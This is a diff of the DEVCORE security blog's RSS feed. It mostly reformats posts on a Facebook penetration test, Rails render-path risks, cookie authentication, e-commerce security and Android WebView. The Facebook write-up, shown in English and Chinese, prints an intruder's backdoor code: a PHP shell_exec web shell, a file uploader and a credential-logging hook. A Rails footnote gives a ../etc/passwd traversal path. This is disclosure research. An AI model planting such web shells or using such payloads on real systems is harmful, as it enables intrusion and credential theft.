+&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
 &lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
@@ -884,7 +870,7 @@ Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&a
 
 &lt;p&gt;其中 YUM_CLIENT 就是進行更新的指令，部分代碼如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;/usr/local/bin/yum-client.pl&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
@@ -988,10 +974,7 @@ bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
 
         <item>
                 <title>電商業者的資安困境？</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/cart.jpg&quot; alt=&quot;Photo Credit: https://www.flickr.com/photos/zionfiction/7968029824/&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;台灣電商網站蓬勃發展，豐富的個資、金流都吸引了攻擊者。近期刑事局 165 反詐騙網站上常看到很多電商網站面臨個資外洩的問題，新聞也不斷報導民眾因為個資外洩被詐騙集團騙取錢財。資安問題是電商業者面臨到最大的危機，民眾也很憤怒為什麼這些企業都不肯把資安做好。但我相信，電商網站的業主也是有苦難言。不少企業知道該把資安做好，有些可能不得其法，也可能什麼都做了，卻還是無法防止自己的網站出現在 165 詐騙排行的榜單上。&lt;/p&gt;
+                <description>&lt;p&gt;台灣電商網站蓬勃發展，豐富的個資、金流都吸引了攻擊者。近期刑事局 165 反詐騙網站上常看到很多電商網站面臨個資外洩的問題，新聞也不斷報導民眾因為個資外洩被詐騙集團騙取錢財。資安問題是電商業者面臨到最大的危機，民眾也很憤怒為什麼這些企業都不肯把資安做好。但我相信，電商網站的業主也是有苦難言。不少企業知道該把資安做好，有些可能不得其法，也可能什麼都做了，卻還是無法防止自己的網站出現在 165 詐騙排行的榜單上。&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;內政部警政署 165 反詐騙諮詢專線 民眾通報高風險賣場排名&lt;br /&gt;
@@ -1074,15 +1057,10 @@ bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
 
         <item>
                 <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
-                <description>
-&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
 &lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/facebook.jpg&quot; alt=&quot;Facebook&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -1124,7 +1102,7 @@ bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
 &lt;pre&gt;&lt;code&gt;tfbnw.net
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;TFBNW seemed to stand for “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;”  
+&lt;p&gt;TFBNW seemed to stand for “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;”&lt;br /&gt;
 Then I found bellow server through public data&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;vpn.tfbnw.net
@@ -1226,7 +1204,7 @@ After taking control of the server successfully, the first thing is to check whe
 
 &lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;
 
-&lt;p&gt;First of all I found some strange PHP error messages in “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;”  
+&lt;p&gt;First of all I found some strange PHP error messages in “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;”&lt;br /&gt;
 These error messages seemed to be caused by modifying codes online?&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
@@ -1242,19 +1220,19 @@ I followed the PHP paths in error messages and ended up with discovering suspici
 
 &lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;bN3d10Aw.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;uploader.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;d.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -1277,7 +1255,7 @@ I followed the PHP paths in error messages and ended up with discovering suspici
 &lt;pre&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
 &lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
@@ -1291,7 +1269,7 @@ I followed the PHP paths in error messages and ended up with discovering suspici
   &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;**GUESS&lt;/strong&gt;** they can access to services such as Mail OWA, VPN for advanced penetration…&lt;/p&gt;
+&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetration…&lt;/p&gt;
 
 &lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;
 
@@ -1439,15 +1417,10 @@ Thanks to this event, it inspired me to write some articles about penetration :P
 
         <item>
                 <title>滲透 Facebook 的思路與發現</title>
-                <description>
-&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
 &lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/facebook.jpg&quot; alt=&quot;Facebook&quot; /&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -1610,19 +1583,19 @@ Thanks to this event, it inspired me to write some articles about penetration :P
 
 &lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;沒錯，就是那個 &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;bN3d10Aw.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;uploader.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;d.php&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -1646,7 +1619,7 @@ Thanks to this event, it inspired me to write some articles about penetration :P
 &lt;pre&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
 &lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
@@ -1809,10 +1782,7 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>[已結束] DEVCORE 徵求行政出納人才</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-cURj9jNGh34/VdNGQwioORI/AAAAAAAAAzw/cBOC-1k5rpg/w877-h581-no/devcore_office_1.png&quot; alt=&quot;DEVCORE LOGO&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;（2015.9.16 已結束徵才）&lt;/p&gt;
+                <description>&lt;p&gt;（2015.9.16 已結束徵才）&lt;/p&gt;
 
 &lt;p&gt;戴夫寇爾即將要邁入第四個年頭，在過去的歲月中，我們推廣資安的重要性、強調安全開發。我們堅持提供最高品質的滲透測試服務，協助企業找出隱藏的資安威脅。我們也不斷精進技術，期許自己能成為全台灣第一的滲透測試團隊。&lt;/p&gt;
 
@@ -1912,10 +1882,7 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>Rails 動態樣板路徑的風險</title>
-                <description>
-&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-5Vlr0dDR9YA/VbHwkylOKLI/AAAAAAAAAzU/BiJ2eCEC6Js/w640-h320-no/rails.png&quot; alt=&quot;Rails logo&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等…。&lt;/p&gt;
 
@@ -2040,10 +2007,10 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;div class=&quot;footnotes&quot;&gt;
   &lt;ol&gt;
     &lt;li id=&quot;fn:note1&quot;&gt;
-      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。&amp;nbsp;&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
     &lt;li id=&quot;fn:note2&quot;&gt;
-      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。&amp;nbsp;&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
@@ -2055,11 +2022,7 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
         <item>
                 <title>談 Cookie 認證安全－以宏碁雲端售票為例</title>
-                <description>
-&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-u-F2KxtrEh0/VMtTowWHskI/AAAAAAAAAwo/07yCkSn9vkM/w555-h538-no/tamper_cookie.gif&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-u-F2KxtrEh0/VMtTowWHskI/AAAAAAAAAwo/07yCkSn9vkM/w555-h538-no/tamper_cookie.gif&quot; alt=&quot;tamper cookie&quot; title=&quot;tamper cookie&quot; /&gt;&lt;/a&gt;
-(Photo by &lt;a href=&quot;https://www.flickr.com/photos/mcf1986/2398237441/in/photolist-4DVArp-PhbMe-7JECFz-7JECQt-7JJyrw-bGFngi-5rW57Y-6xHB2u-pu7B57-4c7y2z-aDa9uc-o5bZTa-8L1384-5DkkLv-b6jovn-o5pesn-79zgAq-5Fpj5G-7pz2TV-4bVGh3-6PQ929-aE2HH8-bnKBwv-brCnx3-bsqgqU-6xHC89-5ELJKU-6rocvE-4bVGm7-4bVGpd-4bRG6B-4bVGiC-6SzwyG-5CBhyB-5CBhxp-emi7PE-5fxugW-XpEdp-qDhTXJ-aBrsh-67NH6d-4bVGjN-4bRGaB-phCGo-aP1qDc-aP1riK-aP1rXn-aCQQav-baRCLB-vJ7RW/&quot;&gt;mcf1986&lt;/a&gt;)&lt;/p&gt;
+                <description>&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;
 
 &lt;p&gt;Cookie 是開發網頁應用程式很常利用的東西，它是為了解決 HTTP stateless 特性但又需要有互動而產生的。開發者想把什麼資訊暫存在用戶瀏覽器都可以透過 Cookie 來完成，只要資訊量不大於約 4KB 的限制就沒問題。在這樣的空間裡，可以放購物車內的暫存商品、可以儲存讀者閱讀記錄以精準推薦產品、當然也可以寫入一些認證資訊讓使用者能保持登入狀態。&lt;/p&gt;
 
@@ -2135,10 +2098,12 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;首先，Cookie 是存在客戶端的，所以有機會被看到、被竄改、被其他人偷走。基於這些原因，不建議在 Cookie 中儲存機敏資料，或是存放會影響伺服器運作的重要參數，需評估一下這些暫存資料被人家看到或修改是不是沒差，這是儲存的原則。如果權衡後還是要在 Cookie 中存放重要資料，那就需要對值加密避免被讀改，而且要確保加密的強度以及其他人是否能透過其他方法解析修改。最後，Cookie 最常被偷走的方式是透過 JavaScript，所以建議在重要的 Cookie 加上 &lt;a href=&quot;http://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; 能有效的降低被偷走的機率。也來試著整理一下這一小段的重點：&lt;/p&gt;
 
-&lt;p&gt;☑ 機敏資料不要存&lt;br /&gt;
-☑ 加密資訊不可少&lt;br /&gt;
-☑ 設定標頭不怕駭&lt;br /&gt;
-☑ 一次搞定沒煩惱&lt;br /&gt;&lt;/p&gt;
+&lt;ul class=&quot;devcore&quot;&gt;
+  &lt;li&gt;機敏資料不要存&lt;/li&gt;
+  &lt;li&gt;加密資訊不可少&lt;/li&gt;
+  &lt;li&gt;設定標頭不怕駭&lt;/li&gt;
+  &lt;li&gt;一次搞定沒煩惱&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;p&gt;沒想到信手拈來就是三不一沒有，前面再加個勾勾，感覺好像很厲害呢！&lt;/p&gt;
 
@@ -2155,11 +2120,8 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
         <item>
                 <title>從寬宏售票談資安</title>
-                <description>
-&lt;p&gt;戴夫寇爾部落格停載了快兩個月，非常抱歉，讓各位常常催稿的朋友們久等了 &amp;lt;(_ _)&amp;gt;&lt;br /&gt;
+                <description>&lt;p&gt;戴夫寇爾部落格停載了快兩個月，非常抱歉，讓各位常常催稿的朋友們久等了 &amp;lt;(_ _)&amp;gt;&lt;br /&gt;
 今天就乘著全臺瘋買票的浪頭，來談談一些常被忽略的資訊安全小概念吧！&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-HFoHvAu_6kU/VK-iyc6JkrI/AAAAAAAAAvw/9mF_ebSMHUc/w878-h596-no/kham.com.tw.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-HFoHvAu_6kU/VK-iyc6JkrI/AAAAAAAAAvw/9mF_ebSMHUc/w878-h596-no/kham.com.tw.png&quot; alt=&quot;寬宏售票&quot; title=&quot;寬宏售票&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -2177,7 +2139,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 如果今天壞人拿到了這把鑰匙，是不是只要繞過保全的視線，就可以打開金庫為所欲為？&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-W3tAzOTSrrk/VK-iw2tdc9I/AAAAAAAAAvY/Qtq4pzXFGmE/w640-h427-no/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-W3tAzOTSrrk/VK-iw2tdc9I/AAAAAAAAAvY/Qtq4pzXFGmE/w640-h427-no/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;
-（Photo by StockMonkeys.com）&lt;/p&gt;
+&lt;br /&gt;（Photo by StockMonkeys.com）&lt;/p&gt;
 
 &lt;p&gt;類似的狀況也滿常發生在電子商務與第三方金流服務的串接上。&lt;br /&gt;
 許多電子商務網站專注於商務，選擇將付款步驟委託第三方金流服務處理，一般常見的流程是這樣的：&lt;/p&gt;
@@ -2245,11 +2207,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
         <item>
                 <title>Android WebView 為你的使用者打開了漏洞之門你知道嗎？</title>
-                <description>
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-BtDqPupmJiA/VDy2gz9bkQI/AAAAAAAAAuM/liUV3DXWcuE/s500-no/14773948755_6f8774540b_o.jpg&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-BtDqPupmJiA/VDy2gz9bkQI/AAAAAAAAAuM/liUV3DXWcuE/s500-no/14773948755_6f8774540b_o.jpg&quot; alt=&quot;opened door&quot; title=&quot;opened door&quot; /&gt;&lt;/a&gt;
-[Credit: &lt;a href=&quot;https://www.flickr.com/photos/chrisgold/14773948755/in/photostream/&quot;&gt;Chris Goldberg(flickr)&lt;/a&gt;]&lt;/p&gt;
-
-&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;
+                <description>&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -2406,11 +2364,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
         <item>
                 <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
-                <description>
